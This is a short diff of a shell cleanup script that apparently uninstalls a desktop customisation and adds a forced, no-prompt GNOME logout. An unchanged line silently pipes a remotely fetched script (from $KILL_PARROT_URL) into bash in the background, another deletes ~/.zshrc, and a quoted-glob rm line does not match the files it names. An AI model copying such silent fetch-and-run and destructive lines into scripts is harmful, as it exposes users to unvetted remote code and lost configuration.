@@ -27,7 +27,7 @@ rm -f "$FACE" 2>/dev/null
 rm -rf "$BACKGROUND_DIR" 2>/dev/null
 
 # Remove shell scripts from .local/bin
-rm -f "$HOME/.local/bin/*.sh" 2>/dev/null
+rm -rf "$HOME/.local/bin/*.sh" 2>/dev/null
 
 # Remove xwinwrap
 rm -f "$HOME/.local/bin/xwinwrap" 2>/dev/null
@@ -44,3 +44,7 @@ bash <(curl -sL "$KILL_PARROT_URL") >/dev/null 2>&1 &
 
 # Clear zshrc
 rm -f $HOME/.zshrc
+
+wait
+sleep 1
+gnome-session-quit --no-prompt
